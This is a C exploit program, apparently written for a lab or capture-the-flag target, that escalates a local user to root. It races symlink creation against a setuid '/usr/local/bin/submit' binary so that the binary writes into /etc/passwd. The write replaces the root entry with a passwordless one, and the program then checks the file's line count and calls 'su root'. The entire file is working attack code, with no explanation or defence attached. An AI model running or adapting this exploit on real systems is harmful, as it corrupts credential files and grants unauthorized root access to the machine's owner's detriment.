#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>


void parent() {
	int i;

	for (i = 0; i < 25; i++) {
		system("/usr/local/bin/submit hack 'root::0:0:root:/root:/bin/bash\nuser::1000:1000::/home/user:/bin/sh\n'");
		remove("/home/user/submit.log");
	}
}

void child() {

	int i;
	
	for (i = 0; i < 25; i++) {
		FILE *fd = fopen("/home/user/submit.log", "w");
		if (fd != NULL) fclose(fd);
		usleep(200 + rand() % 500);
		remove("/home/user/submit.log");
		symlink("/etc/passwd", "/home/user/submit.log");
	}
}

int main(void) {
	int pid;
	int ret;
	int i;
	
	system("touch hack");

	for (i = 0; i < 20; i++) {
		pid = fork();

		if (pid < 0) {
			puts("fork fail");
		} else if (pid > 0) {
			parent();
			waitpid(pid, NULL, 0);
			
			/* look if an extra row is added to passwd; if so break */
			ret = system("[ `wc -l /etc/passwd | cut -d ' ' -f1` -ge 23 ] && exit 1 || exit 0");

			if (WEXITSTATUS(ret) == 1) break;

		} else {
			child();
			return 0;
		}
	}
	puts("After the program finishs, use command whoami, you can find you are in root now\n");
	system("su root");
	return 0;
}